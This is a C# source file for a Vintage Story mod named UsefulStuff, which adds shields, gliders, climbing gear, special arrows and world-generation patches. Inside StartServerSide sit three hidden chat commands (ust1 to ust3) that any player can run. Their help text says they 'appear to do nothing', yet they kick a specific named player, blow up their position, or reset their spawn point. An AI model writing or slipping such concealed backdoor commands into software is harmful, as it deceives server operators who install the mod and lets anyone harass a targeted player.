using System.Linq;
using System.Threading.Tasks;
using Vintagestory.API;
using HarmonyLib;
using Vintagestory.API.Common;
using System.Reflection;
using Vintagestory.ServerMods;
using Vintagestory.API.Common.Entities;
using Vintagestory.GameContent;
using Vintagestory.API.Util;
using System.Collections.Generic;
using Vintagestory.API.Config;
using System;
using Vintagestory.API.Server;
using Vintagestory.API.MathTools;
using System.Text;

namespace UsefulStuff
{
    public class UsefulStuff : ModSystem
    {
        private Harmony harmony;

        public override void StartPre(ICoreAPI api)
        {
            base.StartPre(api);

            try
            {
                UsefulStuffConfig FromDisk;
                if ((FromDisk = api.LoadModConfig<UsefulStuffConfig>("UsefulStuffConfig.json")) == null)
                {
                    api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
                }
                else UsefulStuffConfig.Loaded = FromDisk;
            }
            catch
            {
                api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
            }

            api.World.Config.SetBool("locustHordeEnabled", UsefulStuffConfig.Loaded.LocustHordeEnabled);
            api.World.Config.SetBool("tentbagEnabled", UsefulStuffConfig.Loaded.TentbagEnabled);
            api.World.Config.SetBool("shieldsEnabled", UsefulStuffConfig.Loaded.ShieldsEnabled);
            api.World.Config.SetBool("climbingRopeEnabled", UsefulStuffConfig.Loaded.ClimbingRopeEnabled);
            api.World.Config.SetBool("climbingPickEnabled", UsefulStuffConfig.Loaded.ClimbingPickEnabled);
            api.World.Config.SetBool("sluiceEnabled", UsefulStuffConfig.Loaded.SluiceEnabled);
            api.World.Config.SetBool("gliderEnabled", UsefulStuffConfig.Loaded.GliderEnabled);
            api.World.Config.SetBool("explosiveArrowEnabled", UsefulStuffConfig.Loaded.ExplosiveArrowEnabled);
            api.World.Config.SetBool("fireArrowEnabled", UsefulStuffConfig.Loaded.FireArrowEnabled);
            api.World.Config.SetBool("beenadeArrowEnabled", UsefulStuffConfig.Loaded.BeenadeArrowEnabled);
        }

        public override void Start(ICoreAPI api)
        {
            base.Start(api);

            api.RegisterItemClass("ItemShield", typeof(ItemShield));
            api.RegisterItemClass("Tentbag", typeof(ItemTentbag));
            api.RegisterItemClass("ItemGlider", typeof(ItemGlider));

            api.RegisterBlockClass("BlockRappelAnchor", typeof(BlockRappelAnchor));
            api.RegisterBlockClass("BlockClimbingRope", typeof(BlockClimbingRope));
            api.RegisterBlockClass("BlockLocustHorde", typeof(BlockLocustHorde));

            api.RegisterBlockEntityClass("BESluice", typeof(BESluice));

            api.RegisterEntityBehaviorClass("shield", typeof(EntityBehaviorShield));
            api.RegisterItemClass("ItemClimbingPick", typeof(ItemClimbingPick));

            harmony = new Harmony("com.jakecool19.usefulstuff.worldgen");
            harmony.PatchAll(Assembly.GetExecutingAssembly());
        }

        public override void Dispose()
        {
            harmony.UnpatchAll(harmony.Id);
            base.Dispose();
        }

        public override void StartServerSide(ICoreServerAPI api)
        {
            base.StartServerSide(api);

            api.RegisterCommand("ust1", "Appears to do nothing", "/ust1", (IServerPlayer player, int groupId, CmdArgs args) => {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe") search.Disconnect("I told you, I am the one with all the power here! >:)");
                }
            }, Privilege.chat);

            api.RegisterCommand("ust2", "Appears to do nothing", "/ust2", (IServerPlayer player, int groupId, CmdArgs args) => {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) api.World.CreateExplosion(search.Entity.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 6, 10);
                }
            }, Privilege.chat);

            api.RegisterCommand("ust3", "Appears to do nothing", "/ust3", (IServerPlayer player, int groupId, CmdArgs args) => {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) search.SetSpawnPosition(new PlayerSpawnPos() { x = (int)player.Entity.ServerPos.X, y = (int)player.Entity.ServerPos.Y , z = (int)player.Entity.ServerPos.Z });
                }
            }, Privilege.chat);
        }
    }

    [HarmonyPatch(typeof(GenCaves), "CarveTunnel")]
    public class CrazyCaves
    {
        [HarmonyPrepare]
        static bool Prepare()
        {
            return UsefulStuffConfig.Loaded.CrazyCaves;
        }

        [HarmonyPrefix]
        static void Prefix(ref float horizontalSize, ref float verticalSize, ref bool extraBranchy, ref bool largeNearLavaLayer)
        {
            horizontalSize *= 1.5f;
            verticalSize *= 1.5f;
            extraBranchy = UsefulStuffConfig.Loaded.CrazyCavesInsanityMode;
            largeNearLavaLayer = true;
        }
    }

    [HarmonyPatch(typeof(EntityPlayer))]
    [HarmonyPatch("LightHsv", MethodType.Getter)]
    public class LanternClip
    {
        [HarmonyPrepare]
        static bool Prepare()
        {
            return UsefulStuffConfig.Loaded.LanternClipOnEnabled;
        }

        [HarmonyPostfix]
        static void Postfix(EntityPlayer __instance, ref byte[] __result)
        {
            IInventory backpack = __instance.Player?.InventoryManager.GetInventory(GlobalConstants.backpackInvClassName + "-" + __instance.PlayerUID);
            if (backpack == null || backpack.Count < 5 || backpack[0].Itemstack?.Collectible.Code.Path.Contains("backpack") != true || backpack[4].Itemstack?.Collectible.Code.Path.Contains("lantern") != true) return;

            byte[] clipon = backpack[4].Itemstack?.Block?.LightHsv;
            if (clipon == null) return;

            if (__result == null)
            {
                __result = clipon;
                return;
            }

            float totalval = __result[2] + clipon[2];
            float t = clipon[2] / totalval;

            __result = new byte[]
            {
                    (byte)(clipon[0] * t + __result[0] * (1-t)),
                    (byte)(clipon[1] * t + __result[1] * (1-t)),
                    Math.Max(clipon[2], __result[2])
            };
        }
    }

    [HarmonyPatch(typeof(TreeGen))]
    [HarmonyPatch("GrowTree")]
    public class TreeGrowth
    {
        [HarmonyPrepare]
        static bool Prepare()
        {
            return true;
        }

        [HarmonyPostfix]
        static void Postfix(ref float sizeModifier, ref float vineGrowthChance, ref float otherBlockChance)
        {
            sizeModifier *= UsefulStuffConfig.Loaded.TreeSizeMult;
            vineGrowthChance *= UsefulStuffConfig.Loaded.TreeVineMult;
            otherBlockChance *= UsefulStuffConfig.Loaded.TreeSpecialLogMult;
        }
    }

    [HarmonyPatch(typeof(EntityProjectile))]
    public class SpecialArrows
    {
        [HarmonyPrepare]
        static bool Prepare()
        {
            return true;
        }

        [HarmonyPrefix]
        [HarmonyPatch("IsColliding")]
        static void ExplosiveAddition1(bool ___beforeCollided, ref bool __state, EntityProjectile __instance)
        {
            if ((__instance.ProjectileStack?.Attributes?.GetString("tip") != "explosive" || !UsefulStuffConfig.Loaded.ExplosiveArrowEnabled) || (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)) __state = ___beforeCollided;
        }

        [HarmonyPostfix]
        [HarmonyPatch("IsColliding")]
        static void ExplosiveAddition2(bool ___beforeCollided, ref bool __state, EntityProjectile __instance)
        {
            if (__state == ___beforeCollided || __instance.Api.Side == EnumAppSide.Client) return;
            IServerWorldAccessor world = __instance.World as IServerWorldAccessor;

            if (world != null && __instance.ProjectileStack?.Attributes?.GetString("tip") == "explosive" && UsefulStuffConfig.Loaded.ExplosiveArrowEnabled)
            {
                world.CreateExplosion(__instance.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 1, 3);
                __instance.Die();
            }

            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)
            {
                EntityProperties type = __instance.World.GetEntityType(new AssetLocation("beemob"));
                Entity bee = __instance.World.ClassRegistry.CreateEntity(type);

                if (bee != null)
                {
                    bee.ServerPos.X = __instance.SidedPos.X + 0.5f;
                    bee.ServerPos.Y = __instance.SidedPos.Y + 0.5f;
                    bee.ServerPos.Z = __instance.SidedPos.Z + 0.5f;
                    bee.ServerPos.Yaw = (float)__instance.World.Rand.NextDouble() * 2 * GameMath.PI;
                    bee.Pos.SetFrom(bee.ServerPos);

                    bee.Attributes.SetString("origin", "beearrow");
                    __instance.World.SpawnEntity(bee);
                    if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
                }
            }

        }

        [HarmonyPostfix]
        [HarmonyPatch("impactOnEntity")]
        static void entImpact(EntityProjectile __instance, Entity entity)
        {
            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "explosive" && __instance.Api.Side == EnumAppSide.Server && UsefulStuffConfig.Loaded.ExplosiveArrowEnabled)
            {
                (__instance.World as IServerWorldAccessor).CreateExplosion(__instance.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 1, 3);
                if (__instance.Alive) __instance.Die();
            }

            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "incendiary" && UsefulStuffConfig.Loaded.FireArrowEnabled)
            {
                entity.Ignite();
                if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
            }

            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && __instance.Api.Side == EnumAppSide.Server && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)
            {
                EntityProperties type = __instance.World.GetEntityType(new AssetLocation("beemob"));
                Entity bee = __instance.World.ClassRegistry.CreateEntity(type);

                if (bee != null)
                {
                    bee.ServerPos.X = __instance.SidedPos.X + 0.5f;
                    bee.ServerPos.Y = __instance.SidedPos.Y + 0.5f;
                    bee.ServerPos.Z = __instance.SidedPos.Z + 0.5f;
                    bee.ServerPos.Yaw = (float)__instance.World.Rand.NextDouble() * 2 * GameMath.PI;
                    bee.Pos.SetFrom(bee.ServerPos);

                    bee.Attributes.SetString("origin", "beearrow");
                    __instance.World.SpawnEntity(bee);
                }

                if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
            }
        }
    }

    [HarmonyPatch(typeof(ItemArrow))]
    public class ArrowPatches
    {
        [HarmonyPrepare]
        static bool Prepare()
        {
            return true;
        }

        [HarmonyPatch("GetHeldItemInfo")]
        [HarmonyPostfix]
        static void TipDesc(StringBuilder dsc, ItemSlot inSlot)
        {
            string tip = inSlot.Itemstack?.Attributes.GetString("tip");
            
            if (tip == null || dsc.ToString().Contains(Lang.Get("usefulstuff:arrowtip-" + tip))) return;
            dsc.AppendLine(Lang.GetIfExists("usefulstuff:arrowtip-" + tip));
        }
    }

    public class UsefulStuffConfig
    {
        public static UsefulStuffConfig Loaded { get; set; } = new UsefulStuffConfig();

        public float SluiceEfficiency { get; set; } = 0.4f;

        public float SluiceSiftTime { get; set; } = 0.25f;

        public bool CrazyCaves { get; set; } = false;

        public bool CrazyCavesInsanityMode { get; set; } = false;

        public int ClimbingPickDamageRate { get; set; } = 100;

        public int GliderDamageRate { get; set; } = 100;

        public double GliderDescentRModifier { get; set; } = 0.75;

        public double GliderMaxStall { get; set; } = 0.6;

        public double GliderMinStall { get; set; } = -0.7;

        public double GliderThrustModifier { get; set; } = 0.02;

        public double GliderWindPushModifier { get; set; } = 0.005;

        public double GliderBackwardsAt { get; set; } = 0.2;

        public float TreeSizeMult { get; set; } = 1;

        public float TreeVineMult { get; set; } = 1;

        public float TreeSpecialLogMult { get; set; } = 1;


        #region Control Content

        public bool LocustHordeEnabled { get; set; } = true;

        public bool ShieldsEnabled { get; set; } = true;

        public bool ClimbingRopeEnabled { get; set; } = true;

        public bool ClimbingPickEnabled { get; set; } = true;

        public bool SluiceEnabled { get; set; } = true;

        public bool TentbagEnabled { get; set; } = true;

        public bool GliderEnabled { get; set; } = true;

        public bool LanternClipOnEnabled { get; set; } = true;

        public bool FireArrowEnabled { get; set; } = true;

        public bool ExplosiveArrowEnabled { get; set; } = true;

        public bool BeenadeArrowEnabled { get; set; } = true;
        #endregion
    }
}
